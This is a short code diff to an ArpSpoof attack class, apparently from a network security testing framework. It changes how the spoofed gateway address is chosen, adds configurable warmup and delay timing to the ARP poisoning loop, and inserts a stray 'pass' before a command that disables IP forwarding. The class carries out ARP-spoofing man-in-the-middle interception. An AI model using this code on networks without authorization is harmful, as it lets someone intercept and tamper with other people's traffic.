@@ -18,9 +18,7 @@ class ArpSpoof(GenericAttack):
 
     def initialize(self, result):
         self.running = True
-        gateway = self.device["gateway-ip"]
-        if self.config["gateway_ip"] != "":
-            gateway = self.config["gateway_ip"]
+        gateway = self.device["target-ip"]
 
         self.respoofer(self.device["ip"], gateway)
         return
@@ -42,9 +40,16 @@ class ArpSpoof(GenericAttack):
         try:
             targetMac = ioutil.NetworkUtil.getMacbyIp(targetIp)
             gatewayMAC = ioutil.NetworkUtil.getMacbyIp(gatewayIp)
+            sleepTime = self.config['delay_in_seconds']
+            warmupTime = self.config['warmup_in_seconds']
+            iter = 0
             while self.running:
                 self.arpspoof(targetIp, gatewayIp, gatewayMAC, targetMac)
-                time.sleep(2)
+                if iter < 5:
+                    iter += 1
+                    time.sleep(warmupTime)
+                else:
+                    time.sleep(sleepTime)
             self.restoreARP(targetIp, gatewayIp)
             self.disable_packet_forwarding()
             self.terminateDump()
@@ -70,6 +75,7 @@ class ArpSpoof(GenericAttack):
             os.system('sysctl -w net.inet.ip.forwarding=0 > /dev/null')
             os.system('sudo sysctl -w net.inet.ip.fw.enable=0 > /dev/null ')
         else:
+            pass
             os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
     def arpspoof(self, gatewayIP, victimIP, gatewayMac, victimMac):
